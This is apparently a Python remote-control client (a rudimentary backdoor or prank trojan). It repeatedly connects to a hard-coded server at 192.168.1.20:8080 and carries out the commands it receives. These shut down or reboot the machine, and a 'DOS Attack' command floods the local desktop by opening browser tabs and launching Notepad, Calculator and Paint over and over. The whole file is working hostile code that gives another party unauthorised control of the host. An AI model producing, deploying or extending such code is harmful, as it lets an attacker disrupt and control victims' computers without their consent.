import time
import socket
import os
import platform

def connect_to_server():
    while True:
        try:
            s = socket.socket()
            host = "192.168.1.20"  # Server IP address
            port = 8080
            s.connect((host, port))
            print("Connected to server")
            return s
        except socket.error as e:
            print(f"Connection failed: {e}. Retrying in 5 seconds...")
            time.sleep(5)

s = connect_to_server()

while True:
    command = s.recv(1024).decode()
    
    if command == "shutdown":
        print("Shutdown command received.")
        s.send("command received".encode())
        
        # Cross-platform shutdown command
        if platform.system() == "Windows":
            os.system("shutdown.exe /s /t 00")
        else:
            os.system("shutdown now")  # Unix-based system command

    elif command == "restart":
        print("Restart command received.")
        s.send("command received".encode())
        
        # Cross-platform restart command
        if platform.system() == "Windows":
            os.system("shutdown.exe /r /t 00")
        else:
            os.system("reboot")  # Unix-based system command

    elif command == "DOS Attack":
        print("DOS Attack command received.")
        s.send("command received".encode())
        
        # Enhanced DOS attack loop
        urls = [
            "https://youtu.be/dQw4w9WgXcQ",
            "https://www.example.com",
            "https://www.google.com",
            "https://www.reddit.com",
            "https://www.wikipedia.org"
        ]
        
        applications = [
            "notepad.exe" if platform.system() == "Windows" else "gedit",
            "calc.exe" if platform.system() == "Windows" else "gnome-calculator",
            "mspaint.exe" if platform.system() == "Windows" else "eog"  # image viewer as alternative
        ]
        
        for _ in range(5):
            for url in urls:
                if platform.system() == "Windows":
                    os.system(f"start msedge.exe {url}")
                else:
                    os.system(f"xdg-open {url}")  # Open URL on Unix systems
            for app in applications:
                os.system(f"start {app}" if platform.system() == "Windows" else f"{app} &")  # Background on Unix
            time.sleep(1)

    

    elif command == "exit":
        print("Exit command received. Disconnecting from server.")
        s.close()
        break
    
    else:
        print("Unknown command received.")
        s.send("Unknown command".encode())
